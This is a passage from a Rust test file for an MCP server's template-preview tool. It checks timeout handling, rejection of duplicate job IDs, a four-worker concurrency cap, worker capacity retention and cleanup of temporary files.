    fs::write(&sentinel_path, sentinel_bytes).unwrap();

    // Call preview_draft_to_png_bounded with 0ms timeout (deadline forced before publication)
    let res = AgentTemplateService::preview_draft_to_png_bounded(
        &draft,
        &sentinel_path,
        1.0,
        Some(640),
        Some(360),
        Some(std::time::Duration::from_millis(0)),
        None,
    );
    assert!(
        res.is_err(),
        "Forced deadline before publication must fail with timeout"
    );

    // Sentinel destination bytes must be 100% preserved
    let current_bytes = fs::read(&sentinel_path).unwrap();
    assert_eq!(
        current_bytes, sentinel_bytes,
        "Original destination bytes must survive timeout before publication"
    );

    // 2. Through real MCP transport: tight timeoutMs must return OPERATION_TIMEOUT and preserve sentinel
    let mcp_sentinel = temp.as_ref().join("mcp_sentinel.png");
    let mcp_sentinel_bytes = b"MCP_SENTINEL_BYTES_SURVIVE_TIMEOUT";
    fs::write(&mcp_sentinel, mcp_sentinel_bytes).unwrap();

    let mut client = DuplexMcpClient::new(server.clone()).await;
    let res_timeout = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "outputPath": mcp_sentinel.to_str().unwrap(),
                "timeSeconds": 1.0,
                "timeoutMs": 1,
            }),
        )
        .await;

    assert_eq!(
        res_timeout["result"]["isError"].as_bool(),
        Some(true),
        "Tight timeout must return error receipt"
    );
    let err_msg = res_timeout["result"]["content"][0]["text"]
        .as_str()
        .unwrap_or("");
    assert!(
        err_msg.contains("OPERATION_TIMEOUT") || err_msg.contains("timed out"),
        "Error message must indicate timeout: {err_msg}"
    );

    let mcp_bytes_after = fs::read(&mcp_sentinel).unwrap();
    assert_eq!(
        mcp_bytes_after, mcp_sentinel_bytes,
        "Sentinel destination must NEVER be replaced when OPERATION_TIMEOUT is reported"
    );

    // 3. Successful commit: returns success receipt and updates destination atomically
    let valid_dest = temp.as_ref().join("valid_commit.png");
    let res_success = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "outputPath": valid_dest.to_str().unwrap(),
                "timeSeconds": 1.0,
                "timeoutMs": 5000,
            }),
        )
        .await;

    assert_ne!(
        res_success["result"]["isError"].as_bool(),
        Some(true),
        "Successful preview must return success: {:?}",
        res_success
    );
    assert!(valid_dest.exists(), "Committed output must exist on disk");
    let png_header = fs::read(&valid_dest).unwrap();
    assert!(
        png_header.starts_with(b"\x89PNG\r\n\x1a\n"),
        "Committed output must be a valid PNG"
    );
}

#[tokio::test]
async fn test_p35_ac29_p1_duplicate_job_ids_dedupe_reject_active_workers_never_exceed_four() {
    let server = TinixCutMcpServer::new();
    let temp = test_dir("dup_job_ids");
    let draft = create_vietnamese_title_draft_v1();

    // 1. Send 6 concurrent requests with the SAME jobId
    let shared_job_id = "same_job_id_stress_test".to_string();
    let mut handles = Vec::new();

    for i in 0..6 {
        let s_clone = server.clone();
        let d_clone = draft.clone();
        let jid = shared_job_id.clone();
        let out_path = temp.as_ref().join(format!("dup_render_{}.png", i));
        let handle = tokio::spawn(async move {
            let mut c = DuplexMcpClient::new(s_clone).await;
            c.call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": d_clone,
                    "outputPath": out_path.to_str().unwrap(),
                    "timeSeconds": 1.0,
                    "timeoutMs": 5000,
                    "jobId": jid,
                }),
            )
            .await
        });
        handles.push(handle);
    }

    let mut success_count = 0;
    let mut rejected_count = 0;

    for h in handles {
        let r = h.await.unwrap();
        if r["result"]["isError"].as_bool() == Some(true) {
            let err_text = r["result"]["content"][0]["text"].as_str().unwrap_or("");
            if err_text.contains("DUPLICATE_ACTIVE_JOB")
                || err_text.contains("already active")
                || err_text.contains("already running")
            {
                rejected_count += 1;
            }
        } else {
            success_count += 1;
        }
    }

    // At least 5 requests must be rejected as duplicate active jobs
    assert!(
        rejected_count >= 5,
        "Duplicate active job requests must be deduplicated/rejected: rejected={}, success={}",
        rejected_count,
        success_count
    );
    assert_eq!(
        success_count + rejected_count,
        6,
        "All 6 same-ID requests must be handled"
    );

    // 2. Distinct-ID control: 6 concurrent requests with distinct IDs
    // Active running workers must never exceed 4 (max concurrency)
    let monitor_jobs = server.jobs.clone();
    let max_running = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let max_running_clone = max_running.clone();
    let stop_monitor = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let stop_monitor_clone = stop_monitor.clone();

    let monitor_handle = tokio::spawn(async move {
        while !stop_monitor_clone.load(std::sync::atomic::Ordering::SeqCst) {
            if let Ok(jm) = monitor_jobs.lock() {
                let cnt = jm.running_count();
                max_running_clone.fetch_max(cnt, std::sync::atomic::Ordering::SeqCst);
            }
            tokio::time::sleep(std::time::Duration::from_millis(2)).await;
        }
    });

    let mut distinct_handles = Vec::new();
    for i in 0..6 {
        let s_clone = server.clone();
        let d_clone = draft.clone();
        let jid = format!("distinct_control_job_{}", i);
        let out_path = temp.as_ref().join(format!("distinct_render_{}.png", i));
        let handle = tokio::spawn(async move {
            let mut c = DuplexMcpClient::new(s_clone).await;
            c.call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": d_clone,
                    "outputPath": out_path.to_str().unwrap(),
                    "timeSeconds": 1.0,
                    "timeoutMs": 10000,
                    "jobId": jid,
                }),
            )
            .await
        });
        distinct_handles.push(handle);
    }

    for h in distinct_handles {
        let r = h.await.unwrap();
        assert_ne!(
            r["result"]["isError"].as_bool(),
            Some(true),
            "Distinct preview request must succeed: {:?}",
            r
        );
    }

    stop_monitor.store(true, std::sync::atomic::Ordering::SeqCst);
    let _ = monitor_handle.await;

    let peak = max_running.load(std::sync::atomic::Ordering::SeqCst);
    assert!(
        peak <= 4,
        "Active workers must never exceed 4, peak seen: {}",
        peak
    );

    // After all distinct workers finish, running count must be 0 (no leaked slots)
    assert_eq!(
        server.jobs.lock().unwrap().running_count(),
        0,
        "All job slots must be released upon worker completion"
    );
}

#[tokio::test]
async fn test_p35_ac30_p1_worker_capacity_retained_until_worker_exit_under_timeout_and_cancellation(
) {
    let server = TinixCutMcpServer::new();
    let temp = test_dir("capacity_retained_until_exit");
    let draft = create_vietnamese_title_draft_v1();

    // Deterministic barrier to block workers inside preview_draft_to_temp_bounded
    let barrier = std::sync::Arc::new(std::sync::Barrier::new(5)); // 4 workers + 1 test coordinator
    let actual_entered = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let actual_live = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let actual_peak = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let same_id_live = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let same_id_peak = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));

    let b_clone = barrier.clone();
    let entered_clone = actual_entered.clone();
    let live_clone = actual_live.clone();
    let peak_clone = actual_peak.clone();
    let same_live_clone = same_id_live.clone();
    let same_peak_clone = same_id_peak.clone();

    // Hook called at worker execution start inside preview_draft_to_temp_bounded
    AgentTemplateService::set_worker_execution_hook(Some(std::sync::Arc::new(
        move |output_path| {
            let path_str = output_path.to_string_lossy();
            if !path_str.contains("capacity_retained_until_exit") {
                return;
            }

            let is_same_id = path_str.contains("blocked_worker_0");
            if is_same_id {
                let cur = same_live_clone.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
                same_peak_clone.fetch_max(cur, std::sync::atomic::Ordering::SeqCst);
            }
            let cur_live = live_clone.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
            peak_clone.fetch_max(cur_live, std::sync::atomic::Ordering::SeqCst);
            let count = entered_clone.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;

            // Block the first 4 workers deterministically
            if count <= 4 {
                b_clone.wait();
            }

            live_clone.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
            if is_same_id {
                same_live_clone.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
            }
        },
    )));

    // 1. Submit 4 concurrent workers that will be blocked at the barrier
    let mut initial_handles = Vec::new();
    for i in 0..4 {
        let s_clone = server.clone();
        let d_clone = draft.clone();
        let jid = format!("blocked_worker_{}", i);
        let out_path = temp.as_ref().join(format!("blocked_worker_{}.png", i));
        let handle = tokio::spawn(async move {
            let mut c = DuplexMcpClient::new(s_clone).await;
            c.call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": d_clone,
                    "outputPath": out_path.to_str().unwrap(),
                    "timeSeconds": 1.0,
                    "timeoutMs": 100, // Short timeout: outer handler will timeout while worker is blocked
                    "jobId": jid,
                }),
            )
            .await
        });
        initial_handles.push(handle);
    }

    // Wait until all 4 initial workers have entered the execution hook and are blocked
    while actual_entered.load(std::sync::atomic::Ordering::SeqCst) < 4 {
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    }

    // 2. Wait for the initial 4 requests to time out from the outer handler's perspective
    for h in initial_handles {
        let r = h.await.unwrap();
        assert_eq!(
            r["result"]["isError"].as_bool(),
            Some(true),
            "Outer request must report timeout"
        );
        let err_text = r["result"]["content"][0]["text"].as_str().unwrap_or("");
        assert!(
            err_text.contains("OPERATION_TIMEOUT") || err_text.contains("timed out"),
            "Error text must indicate timeout: {err_text}"
        );
    }

    // AT THIS POINT:
    // Outer timeouts have dropped the join handles and marked jobs failed in JobManager.
    // BUT the 4 worker threads are STILL BLOCKED at the barrier holding their permits!
    assert_eq!(
        server.worker_capacity.live_workers(),
        4,
        "Capacity permits must still be held by blocked worker closures"
    );

    // 3. Submit replacement requests while the 4 workers are still blocked:
    // a) Submit a same-ID request: "blocked_worker_0"
    let s_clone = server.clone();
    let d_clone = draft.clone();
    let same_id_out = temp.as_ref().join("blocked_worker_0_replacement.png");
    let same_id_res = {
        let mut c = DuplexMcpClient::new(s_clone).await;
        c.call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": d_clone,
                "outputPath": same_id_out.to_str().unwrap(),
                "timeSeconds": 1.0,
                "timeoutMs": 100,
                "jobId": "blocked_worker_0",
            }),
        )
        .await
    };
    // Must be rejected as DUPLICATE_ACTIVE_JOB because blocked_worker_0 is still active in closure
    assert_eq!(
        same_id_res["result"]["isError"].as_bool(),
        Some(true),
        "Same-ID request must be rejected while original worker is still running: {:?}",
        same_id_res
    );
    let same_err = same_id_res["result"]["content"][0]["text"]
        .as_str()
        .unwrap_or("");
    assert!(
        same_err.contains("DUPLICATE_ACTIVE_JOB") || same_err.contains("already"),
        "Error message must indicate duplicate active job: {same_err}"
    );

    // b) Submit 2 distinct-ID replacement requests with longer timeouts
    let mut replacement_handles = Vec::new();
    for i in 4..6 {
        let s_clone = server.clone();
        let d_clone = draft.clone();
        let jid = format!("replacement_worker_{}", i);
        let out_path = temp.as_ref().join(format!("replacement_worker_{}.png", i));
        let handle = tokio::spawn(async move {
            let mut c = DuplexMcpClient::new(s_clone).await;
            c.call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": d_clone,
                    "outputPath": out_path.to_str().unwrap(),
                    "timeSeconds": 1.0,
                    "timeoutMs": 10000,
                    "jobId": jid,
                }),
            )
            .await
        });
        replacement_handles.push(handle);
    }

    // Give replacement requests a moment to attempt acquiring permits
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Verify: active workers still cannot exceed 4 even with replacements queued!
    assert!(
        actual_peak.load(std::sync::atomic::Ordering::SeqCst) <= 4,
        "Actual worker peak must never exceed 4: peak={}",
        actual_peak.load(std::sync::atomic::Ordering::SeqCst)
    );
    assert!(
        same_id_peak.load(std::sync::atomic::Ordering::SeqCst) <= 1,
        "Same-ID peak must never exceed 1: peak={}",
        same_id_peak.load(std::sync::atomic::Ordering::SeqCst)
    );

    // 4. Release the 4 blocked workers
    barrier.wait();

    // 5. Await the replacement workers - they should now acquire capacity, execute, and succeed!
    for h in replacement_handles {
        let r = h.await.unwrap();
        assert_ne!(
            r["result"]["isError"].as_bool(),
            Some(true),
            "Replacement preview request must succeed after slots freed: {:?}",
            r
        );
    }

    // Verify peak invariant across the whole test
    let distinct_peak = actual_peak.load(std::sync::atomic::Ordering::SeqCst);
    let same_peak = same_id_peak.load(std::sync::atomic::Ordering::SeqCst);
    assert!(
        distinct_peak <= 4,
        "Distinct-ID peak must never exceed 4, actual: {}",
        distinct_peak
    );
    assert!(
        same_peak <= 1,
        "Same-ID peak must never exceed 1, actual: {}",
        same_peak
    );

    // Verify all permits released
    assert_eq!(
        server.worker_capacity.live_workers(),
        0,
        "All worker capacity permits must be released after completion"
    );

    // Clean up hook
    AgentTemplateService::set_worker_execution_hook(None);
}

#[tokio::test]
async fn test_p35_ac31_p1_detached_worker_temp_file_cleanup_on_drop_and_final_publication_check() {
    let server = TinixCutMcpServer::new();
    let temp = test_dir("detached_worker_temp_cleanup");
    let draft = create_vietnamese_title_draft_v1();

    // 1. Create a sentinel destination file that must be preserved
    let sentinel_path = temp.as_ref().join("sentinel_destination.png");
    let sentinel_bytes = b"SENTINEL_DESTINATION_MUST_SURVIVE_DETACHED_WORKER";
    fs::write(&sentinel_path, sentinel_bytes).unwrap();

    // 2. Setup pre-delivery pause hook to simulate detached worker
    let reached_pre_delivery = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let unblock_delivery = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let temp_artifact_path = std::sync::Arc::new(std::sync::Mutex::new(None));

    let reached_clone = reached_pre_delivery.clone();
    let unblock_clone = unblock_delivery.clone();
    let path_clone = temp_artifact_path.clone();

    AgentTemplateService::set_pre_delivery_hook(Some(std::sync::Arc::new(move |temp_path| {
        if !temp_path
            .to_string_lossy()
            .contains("detached_worker_temp_cleanup")
        {
            return;
        }
        *path_clone.lock().unwrap() = Some(temp_path.to_path_buf());
        reached_clone.store(true, std::sync::atomic::Ordering::SeqCst);
        while !unblock_clone.load(std::sync::atomic::Ordering::SeqCst) {
            std::thread::sleep(std::time::Duration::from_millis(5));
        }
    })));

    // 3. Call template preview through MCP with bounded timeout
    let mut client = DuplexMcpClient::new(server.clone()).await;
    let s_path_str = sentinel_path.to_str().unwrap().to_string();
    let d_clone = draft.clone();
    let handle = tokio::spawn(async move {
        client
            .call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": d_clone,
                    "outputPath": s_path_str,
                    "timeSeconds": 1.0,
                    "timeoutMs": 300, // Reaches pre-delivery in ~20ms, then times out while paused in pre-delivery hook
                }),
            )
            .await
    });

    // 4. Wait until the worker has reached pre-delivery (temp file is written to disk)
    let reach_start = std::time::Instant::now();
    while !reached_pre_delivery.load(std::sync::atomic::Ordering::SeqCst) {
        assert!(
            reach_start.elapsed() < std::time::Duration::from_secs(5),
            "Worker must reach pre-delivery within 5s"
        );
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    }

    let recorded_temp_path = temp_artifact_path
        .lock()
        .unwrap()
        .clone()
        .expect("Temp path recorded");
    assert!(
        recorded_temp_path.exists(),
        "Temporary preview file must exist on disk before delivery: {:?}",
        recorded_temp_path
    );

    // 5. Await the MCP response: outer timeout must fire and report error
    let res = handle.await.unwrap();
    assert_eq!(
        res["result"]["isError"].as_bool(),
        Some(true),
        "Outer MCP call must return error on timeout"
    );
    let err_msg = res["result"]["content"][0]["text"].as_str().unwrap_or("");
    assert!(
        err_msg.contains("OPERATION_TIMEOUT") || err_msg.contains("timed out"),
        "Error message must indicate timeout: {err_msg}"
    );

    // Sentinel destination must NOT have been overwritten
    let current_bytes = fs::read(&sentinel_path).unwrap();
    assert_eq!(
        current_bytes, sentinel_bytes,
        "Sentinel file must be preserved completely untouched"
    );

    // 6. Release the paused worker
    unblock_delivery.store(true, std::sync::atomic::Ordering::SeqCst);

    // Wait for the worker thread to exit and drop its result
    let start_wait = std::time::Instant::now();
    while server.worker_capacity.live_workers() > 0
        && start_wait.elapsed() < std::time::Duration::from_secs(3)
    {
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    // Short grace window for filesystem unlink
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // 7. Verify temp file cleanup on drop:
    // The recorded temp file must no longer exist!
    assert!(
        !recorded_temp_path.exists(),
        "Temporary preview artifact must be cleaned up on drop: {:?}",
        recorded_temp_path
    );

    // Scan parent directory: zero .tmp_preview_* files must remain
    let parent_dir = sentinel_path.parent().unwrap();
    let mut lingering_temp_files = Vec::new();
    if let Ok(entries) = fs::read_dir(parent_dir) {
        for entry in entries.flatten() {
            let fname = entry.file_name().to_string_lossy().to_string();
            if fname.starts_with(".tmp_preview_") {
                lingering_temp_files.push(fname);
            }
        }
    }
    assert_eq!(
        lingering_temp_files.len(),
        0,
        "Zero .tmp_preview_* files must linger in parent directory: found {:?}",
        lingering_temp_files
    );

    // Sentinel destination must STILL be preserved
    let final_bytes = fs::read(&sentinel_path).unwrap();
    assert_eq!(
        final_bytes, sentinel_bytes,
        "Sentinel file must still be preserved after worker exit"
    );

    // Clean up hook
    AgentTemplateService::set_pre_delivery_hook(None);
}
